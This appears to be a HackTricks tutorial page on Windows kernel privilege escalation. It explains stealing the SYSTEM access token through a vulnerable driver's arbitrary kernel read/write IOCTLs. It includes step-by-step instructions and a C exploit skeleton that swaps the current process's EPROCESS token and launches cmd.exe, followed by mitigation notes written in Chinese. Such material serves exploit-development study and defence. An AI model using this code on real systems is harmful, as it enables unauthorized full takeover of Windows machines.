# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Overview

If a vulnerable driver exposes an IOCTL that gives an attacker arbitrary kernel read and/or write primitives, elevating to NT AUTHORITY\SYSTEM can often be achieved by stealing a SYSTEM access token. The technique copies the Token pointer from a SYSTEM process’ EPROCESS into the current process’ EPROCESS.

Why it works:
- Each process has an EPROCESS structure that contains (among other fields) a Token (actually an EX_FAST_REF to a token object).
- The SYSTEM process (PID 4) holds a token with all privileges enabled.
- Replacing the current process’ EPROCESS.Token with the SYSTEM token pointer makes the current process run as SYSTEM immediately.

> Offsets in EPROCESS vary across Windows versions. Determine them dynamically (symbols) or use version-specific constants. Also remember that EPROCESS.Token is an EX_FAST_REF (low 3 bits are reference count flags).

## High-level steps

1) Locate ntoskrnl.exe base and resolve the address of PsInitialSystemProcess.
- From user mode, use NtQuerySystemInformation(SystemModuleInformation) or EnumDeviceDrivers to get loaded driver bases.
- Add the offset of PsInitialSystemProcess (from symbols/reversing) to the kernel base to get its address.
2) Read the pointer at PsInitialSystemProcess → this is a kernel pointer to SYSTEM’s EPROCESS.
3) From SYSTEM EPROCESS, read UniqueProcessId and ActiveProcessLinks offsets to traverse the doubly linked list of EPROCESS structures (ActiveProcessLinks.Flink/Blink) until you find the EPROCESS whose UniqueProcessId equals GetCurrentProcessId(). Keep both:
- EPROCESS_SYSTEM (for SYSTEM)
- EPROCESS_SELF (for the current process)
4) Read SYSTEM token value: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Mask out the low 3 bits: Token_SYS_masked = Token_SYS & ~0xF (commonly ~0xF or ~0x7 depending on build; on x64 the low 3 bits are used — 0xFFFFFFFFFFFFFFF8 mask).
5) Option A (common): Preserve the low 3 bits from your current token and splice them onto SYSTEM’s pointer to keep the embedded ref count consistent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Write Token_NEW back into (EPROCESS_SELF + TokenOffset) using your kernel write primitive.
7) Your current process is now SYSTEM. Optionally spawn a new cmd.exe or powershell.exe to confirm.

## Pseudocode

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
注意：
- 偏移：使用 WinDbg 的 `dt nt!_EPROCESS` 配合目标的 PDBs，或使用运行时符号加载器，以获取正确的偏移。不要盲目硬编码。
- 掩码：在 x64 上 token 是一个 EX_FAST_REF；低 3 位是引用计数位。保留你 token 的原始低位可以避免立即的引用计数不一致。
- 稳定性：优先提升当前进程；如果你提升的是一个短生命周期的 helper，当它退出时你可能会失去 SYSTEM。

## 检测 & 缓解
- 加载未签名或不受信任的第三方驱动并暴露强大的 IOCTLs 是根本原因。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard 和 Attack Surface Reduction 规则可以阻止易受攻击的驱动加载。
- EDR 可以监视实现任意读/写的可疑 IOCTL 序列以及 token swaps。

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
